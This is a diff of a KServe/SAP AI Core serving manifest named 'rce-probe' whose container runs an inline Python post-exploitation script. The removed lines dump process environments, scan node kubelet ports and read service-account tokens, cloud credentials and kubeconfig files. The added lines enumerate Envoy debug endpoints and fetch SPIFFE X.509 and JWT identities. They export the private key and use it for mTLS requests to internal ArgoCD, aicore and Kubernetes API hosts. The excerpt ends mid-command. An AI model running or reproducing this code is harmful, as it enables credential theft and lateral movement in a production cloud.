@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.0.0"
+    ai.sap.com/version: "4.1.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "node-creds-envoy-ztunnel-probe"
+    executables.ai.sap.com/description: "spiffe-svid-mtls-xds-probe"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,155 +28,255 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, struct, glob, ssl
+            import os, socket, ssl, sys, subprocess, struct, tempfile, stat
 
-            print('[PROBE_V4_START]', flush=True)
+            print('[PROBE_V41_START]', flush=True)
 
-            # --- 1. PID 1 environ (may differ from our process) ---
-            try:
-                with open('/proc/1/environ', 'rb') as f:
-                    env1 = f.read().decode(errors='replace').replace('\x00', '\n')
-                print('[PROC1_ENV]', env1[:3000], flush=True)
-            except Exception as e:
-                print('[PROC1_ENV_ERR]', e, flush=True)
-
-            # --- 2. Local TCP listeners (/proc/net/tcp + tcp6) ---
-            for netf in ['/proc/net/tcp', '/proc/net/tcp6']:
+            # --- 1. Port 15020 path enumeration ---
+            def http_get(host, port, path, timeout=4):
                 try:
-                    with open(netf) as f:
-                        print(f'[{netf}]', f.read()[:1500], flush=True)
-                except Exception as e:
-                    print(f'[{netf}_ERR]', e, flush=True)
-
-            # --- 3. Unix domain sockets ---
-            try:
-                with open('/proc/net/unix') as f:
-                    print('[UNIX_SOCKETS]', f.read()[:2000], flush=True)
-            except Exception as e:
-                print('[UNIX_ERR]', e, flush=True)
-
-            # --- 4. Node IP via default gateway ---
-            node_ip = None
-            try:
-                with open('/proc/net/route') as f:
-                    for line in f.readlines()[1:]:
-                        fields = line.strip().split()
-                        if len(fields) >= 3 and fields[1] == '00000000':
-                            gw = fields[2]
-                            node_ip = '.'.join(str(int(gw[i:i+2], 16)) for i in [6,4,2,0])
-                            print('[NODE_GW]', node_ip, flush=True)
-                            break
-            except Exception as e:
-                print('[NODE_GW_ERR]', e, flush=True)
-
-            try:
-                with open('/proc/net/arp') as f:
-                    print('[ARP]', f.read()[:600], flush=True)
-            except Exception as e:
-                print('[ARP_ERR]', e, flush=True)
-
-            # --- 5. Node port scan ---
-            def tcp_probe(host, port, send=b'GET / HTTP/1.0\r\nHost: x\r\n\r\n', tls=False):
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(4)
+                    s = socket.socket()
+                    s.settimeout(timeout)
                     s.connect((host, port))
-                    if tls:
-                        ctx = ssl.create_default_context()
-                        ctx.check_hostname = False
-                        ctx.verify_mode = ssl.CERT_NONE
-                        s = ctx.wrap_socket(s, server_hostname=host)
-                    if send:
-                        s.sendall(send)
+                    s.sendall(f'GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n'.encode())
                     resp = b''
                     while True:
                         chunk = s.recv(4096)
                         if not chunk: break
                         resp += chunk
-                        if len(resp) > 4000: break
+                        if len(resp) > 8000: break
                     s.close()
-                    return 'OPEN', resp.decode(errors='replace')[:600]
-                except ConnectionRefusedError:
-                    return 'REFUSED', ''
-                except Exception as ex:
-                    return 'ERR', str(ex)[:100]
-
-            if node_ip:
-                for port, use_tls in [(10255, False), (10250, True), (10256, False), (4194, False), (2376, False)]:
-                    status, body = tcp_probe(node_ip, port, tls=use_tls)
-                    print(f'[NODE:{node_ip}:{port}] {status} | {body[:400]}', flush=True)
-
-            # --- 6. Localhost Envoy / ztunnel ports ---
-            for port in [15000, 15001, 15004, 15006, 15020, 15021, 15053, 15090]:
-                status, body = tcp_probe('127.0.0.1', port)
-                print(f'[LOCAL:{port}] {status} | {body[:400]}', flush=True)
-
-            # --- 7. ECS-style credentials endpoint (169.254.170.2) ---
-            ecs_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI', '')
-            rel_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '')
-            if rel_uri:
-                ecs_uri = 'http://169.254.170.2' + rel_uri
-            print('[ECS_URI]', ecs_uri or '(not set)', flush=True)
-            status, body = tcp_probe('169.254.170.2', 80)
-            print('[ECS_META:169.254.170.2:80]', status, body[:300], flush=True)
-
-            # --- 8. Filesystem credential hunt ---
-            paths = [
-                '/var/run/secrets/kubernetes.io/serviceaccount/token',
-                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
-                '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
-                '/var/run/secrets/eks.amazonaws.com/serviceaccount/token',
-                '/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/token',
-                '/var/run/secrets/token',
-                '/run/secrets/',
-                '/secrets/',
-                '/var/run/secrets/sap.com/',
-                '/etc/sap/',
-                '/etc/ai-core/',
-                '/etc/aicore/',
-                '/var/run/sap/',
-                '/root/.aws/credentials',
-                '/.aws/credentials',
-                '/root/.kube/config',
-                '/.kube/config',
-                '/var/lib/cloud/instance/user-data.txt',
-                '/run/cloud-init/',
-                '/etc/cloud/',
-            ]
-            for p in paths:
-                try:
-                    if os.path.isdir(p):
-                        print(f'[DIR:{p}]', sorted(os.listdir(p)), flush=True)
-                    elif os.path.isfile(p):
-                        with open(p, 'rb') as fh:
-                            print(f'[FILE:{p}]', fh.read(600).decode(errors='replace'), flush=True)
+                    return resp.decode(errors='replace')
                 except Exception as e:
-                    print(f'[PATH_ERR:{p}]', str(e)[:60], flush=True)
+                    return f'ERR:{e}'
 
-            for pattern in ['/var/run/secrets/**', '/run/secrets/**']:
-                try:
-                    hits = glob.glob(pattern, recursive=True)
-                    if hits:
-                        print(f'[GLOB:{pattern}]', hits, flush=True)
-                except: pass
+            for path in ['/healthz/ready', '/ready', '/live', '/metrics',
+                         '/debug/config_dump', '/debug/pprof/', '/debug/pprof/heap',
+                         '/debug/ndsz', '/debug/sync', '/app-health/kserve-container/livez',
+                         '/stats/prometheus', '/server_info', '/quitquitquit']:
+                resp = http_get('127.0.0.1', 15020, path)
+                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp else 'MISS'
+                print(f'[15020:{tag}:{path}] {resp[:300]}', flush=True)
 
-            # --- 9. /etc/hosts, /etc/resolv.conf, /proc/self/cgroup ---
-            for f in ['/etc/hosts', '/etc/resolv.conf', '/proc/self/cgroup', '/proc/1/cgroup']:
+            # --- 2. SPIFFE socket stat + XDS socket stat ---
+            for sock_path in ['/var/run/secrets/workload-spiffe-uds/socket',
+                               '/etc/istio/proxy/XDS']:
                 try:
-                    with open(f) as fh:
-                        print(f'[{f}]', fh.read()[:500], flush=True)
+                    st = os.stat(sock_path)
+                    mode = oct(stat.S_IMODE(st.st_mode))
+                    print(f'[SOCK_STAT:{sock_path}] mode={mode} uid={st.st_uid} gid={st.st_gid}', flush=True)
                 except Exception as e:
-                    print(f'[{f}_ERR]', e, flush=True)
+                    print(f'[SOCK_STAT_ERR:{sock_path}] {e}', flush=True)
 
-            # --- 10. Check full /proc/self/environ for anything missed ---
+            # --- 3. XDS socket: raw connection probe ---
             try:
-                with open('/proc/self/environ', 'rb') as fh:
-                    env_self = fh.read().decode(errors='replace').replace('\x00', '\n')
-                print('[SELF_ENV]', env_self[:3000], flush=True)
+                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                s.settimeout(4)
+                s.connect('/etc/istio/proxy/XDS')
+                # Send HTTP/2 preface to see if it's gRPC
+                s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+                resp = s.recv(512)
+                print('[XDS_SOCKET_RESP]', repr(resp[:200]), flush=True)
+                s.close()
             except Exception as e:
-                print('[SELF_ENV_ERR]', e, flush=True)
+                print('[XDS_SOCKET_ERR]', e, flush=True)
 
-            print('[PROBE_V4_DONE]', flush=True)
+            # --- 4. Install grpcio + cryptography ---
+            print('[PIP_INSTALL] starting...', flush=True)
+            r = subprocess.run(
+                [sys.executable, '-m', 'pip', 'install', '-q', '--no-cache-dir',
+                 'grpcio==1.62.0', 'cryptography'],
+                capture_output=True, timeout=120)
+            if r.returncode != 0:
+                print('[PIP_ERR]', r.stderr.decode()[:300], flush=True)
+            else:
+                print('[PIP_OK]', flush=True)
+
+            # --- 5. SPIFFE Workload API: FetchX509SVID ---
+            try:
+                import grpc
+                from cryptography import x509 as cx509
+                from cryptography.hazmat.primitives.serialization import (
+                    load_der_private_key, Encoding, PrivateFormat, NoEncryption)
+                from cryptography.hazmat.backends import default_backend
+
+                def read_varint(data, pos):
+                    result, shift = 0, 0
+                    while True:
+                        b = data[pos]; pos += 1
+                        result |= (b & 0x7F) << shift
+                        if not (b & 0x80): break
+                        shift += 7
+                    return result, pos
+
+                def pb_decode(data):
+                    fields = {}
+                    pos = 0
+                    while pos < len(data):
+                        try:
+                            tag_wire, pos = read_varint(data, pos)
+                        except: break
+                        fn, wt = tag_wire >> 3, tag_wire & 7
+                        if wt == 0:
+                            v, pos = read_varint(data, pos)
+                        elif wt == 2:
+                            ln, pos = read_varint(data, pos)
+                            v = data[pos:pos+ln]; pos += ln
+                        elif wt == 1:
+                            v = data[pos:pos+8]; pos += 8
+                        elif wt == 5:
+                            v = data[pos:pos+4]; pos += 4
+                        else:
+                            break
+                        fields.setdefault(fn, []).append(v)
+                    return fields
+
+                def split_der_chain(der):
+                    certs_pem = []
+                    remaining = der
+                    while remaining:
+                        if len(remaining) < 4 or remaining[0] != 0x30: break
+                        if remaining[1] & 0x80:
+                            nb = remaining[1] & 0x7F
+                            ln = int.from_bytes(remaining[2:2+nb], 'big')
+                            total = 2 + nb + ln
+                        else:
+                            ln = remaining[1]
+                            total = 2 + ln
+                        cert_der = remaining[:total]
+                        try:
+                            cert = cx509.load_der_x509_certificate(cert_der, default_backend())
+                            certs_pem.append(cert.public_bytes(Encoding.PEM))
+                        except: break
+                        remaining = remaining[total:]
+                    return b''.join(certs_pem)
+
+                print('[SPIFFE] connecting to workload API socket...', flush=True)
+                chan = grpc.insecure_channel('unix:///var/run/secrets/workload-spiffe-uds/socket')
+                fetch_x509 = chan.unary_stream(
+                    '/spiffe.workload.SpiffeWorkloadAPI/FetchX509SVID',
+                    request_serializer=lambda x: x,
+                    response_deserializer=lambda x: x)
+
+                metadata = [('workload.spiffe.io', 'true')]
+                svid_cert_pem = None
+                svid_key_pem = None
+                svid_bundle_pem = None
+
+                for raw_resp in fetch_x509(b'', metadata=metadata, timeout=8):
+                    resp_fields = pb_decode(raw_resp)
+                    for svid_bytes in resp_fields.get(1, []):
+                        svid = pb_decode(svid_bytes)
+                        spiffe_id = svid.get(1, [b''])[0].decode(errors='replace')
+                        cert_der  = svid.get(2, [b''])[0]
+                        key_der   = svid.get(3, [b''])[0]
+                        bundle_der= svid.get(4, [b''])[0]
+
+                        print(f'[SPIFFE_ID] {spiffe_id}', flush=True)
+                        print(f'[SVID_SIZES] cert={len(cert_der)} key={len(key_der)} bundle={len(bundle_der)}', flush=True)
+
+                        # Convert to PEM
+                        svid_cert_pem = split_der_chain(cert_der)
+                        if key_der:
+                            priv = load_der_private_key(key_der, password=None, backend=default_backend())
+                            svid_key_pem = priv.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())
+                        svid_bundle_pem = split_der_chain(bundle_der)
+
+                        # Print cert details
+                        if svid_cert_pem:
+                            cert = cx509.load_pem_x509_certificate(svid_cert_pem, default_backend())
+                            print(f'[CERT_SUBJECT] {cert.subject}', flush=True)
+                            print(f'[CERT_ISSUER]  {cert.issuer}', flush=True)
+                            print(f'[CERT_VALIDITY] {cert.not_valid_before_utc} -> {cert.not_valid_after_utc}', flush=True)
+                            try:
+                                san = cert.extensions.get_extension_for_class(cx509.SubjectAlternativeName)
+                                print(f'[CERT_SAN] {san.value.get_values_for_type(cx509.UniformResourceIdentifier)}', flush=True)
+                            except: pass
+                        break
+                    break
+
+                # --- 6. FetchJWTSVID for k8s API audience ---
+                fetch_jwt = chan.unary_unary(
+                    '/spiffe.workload.SpiffeWorkloadAPI/FetchJWTSVID',
+                    request_serializer=lambda x: x,
+                    response_deserializer=lambda x: x)
+
+                for audience in ['kubernetes', 'https://kubernetes.default.svc.cluster.local',
+                                  'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com']:
+                    try:
+                        # JWTSVIDRequest: audience field 1 (repeated string)
+                        aud_bytes = audience.encode()
+                        req_bytes = bytes([0x0A, len(aud_bytes)]) + aud_bytes
+                        raw_jwt = fetch_jwt(req_bytes, metadata=metadata, timeout=5)
+                        jwt_fields = pb_decode(raw_jwt)
+                        for jwt_svid_bytes in jwt_fields.get(1, []):
+                            jwt_svid = pb_decode(jwt_svid_bytes)
+                            jwt_token = jwt_svid.get(2, [b''])[0].decode(errors='replace')
+                            print(f'[JWT_SVID:{audience}] {jwt_token[:200]}', flush=True)
+                    except Exception as e:
+                        print(f'[JWT_ERR:{audience}] {e}', flush=True)
+
+                # --- 7. mTLS connections using SVID cert+key ---
+                if svid_cert_pem and svid_key_pem:
+                    cf = tempfile.NamedTemporaryFile(delete=False, suffix='.pem', mode='wb')
+                    cf.write(svid_cert_pem); cf.close()
+                    kf = tempfile.NamedTemporaryFile(delete=False, suffix='.pem', mode='wb')
+                    kf.write(svid_key_pem); kf.close()
+
+                    def mtls_req(host, port, path='/', sni=None, http2=False, timeout=5):
+                        try:
+                            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                            ctx.check_hostname = False
+                            ctx.verify_mode = ssl.CERT_NONE
+                            ctx.load_cert_chain(cf.name, kf.name)
+                            s = socket.socket()
+                            s.settimeout(timeout)
+                            ss = ctx.wrap_socket(s, server_hostname=sni or host)
+                            ss.connect((host, port))
+                            peer = ss.getpeercert(binary_form=True)
+                            req = f'GET {path} HTTP/1.1\r\nHost: {sni or host}\r\nConnection: close\r\n\r\n'
+                            ss.sendall(req.encode())
+                            resp = b''
+                            while True:
+                                chunk = ss.recv(4096)
+                                if not chunk: break
+                                resp += chunk
+                                if len(resp) > 8000: break
+                            ss.close()
+                            return 'OK', f'peer_cert_len={len(peer or b\"\")} | ' + resp.decode(errors='replace')[:400]
+                        except Exception as e:
+                            return 'ERR', str(e)[:150]
+
+                    print('[MTLS_PROBE] starting with SVID cert...', flush=True)
+                    # Known ClusterIPs and DNS targets
+                    targets = [
+                        # ArgoCD servers
+                        ('100.104.210.229', 80,  '/api/v1/session', 'argocd-server.argocd-tenants.svc.cluster.local'),
+                        ('100.104.210.229', 443, '/api/v1/session', 'argocd-server.argocd-tenants.svc.cluster.local'),
+                        # aicore namespace services by DNS
+                        ('aicore-api-server.aicore.svc.cluster.local', 80, '/', None),
+                        ('ai-api-server.aicore.svc.cluster.local', 80, '/', None),
+                        ('serving-service.aicore.svc.cluster.local', 80, '/', None),
+                        ('execution-service.aicore.svc.cluster.local', 80, '/', None),
+                        ('ml-tracking.aicore.svc.cluster.local', 80, '/', None),
+                        ('user-management.aicore.svc.cluster.local', 80, '/', None),
+                        # orchestration namespace
+                        ('orchestration.orchestration.svc.cluster.local', 80, '/', None),
+                        # k8s API with client cert
+                        ('100.104.0.1', 443, '/version', 'kubernetes'),
+                        ('api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com', 443, '/version', None),
+                    ]
+                    for host, port, path, sni in targets:
+                        status, body = mtls_req(host, port, path, sni)
+                        print(f'[MTLS:{host}:{port}{path}] {status} | {body[:350]}', flush=True)
+
+                    os.unlink(cf.name); os.unlink(kf.name)
+
+            except Exception as e:
+                import traceback
+                print('[SPIFFE_OUTER_ERR]', traceback.format_exc()[:500], flush=True)
+
+            print('[PROBE_V41_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
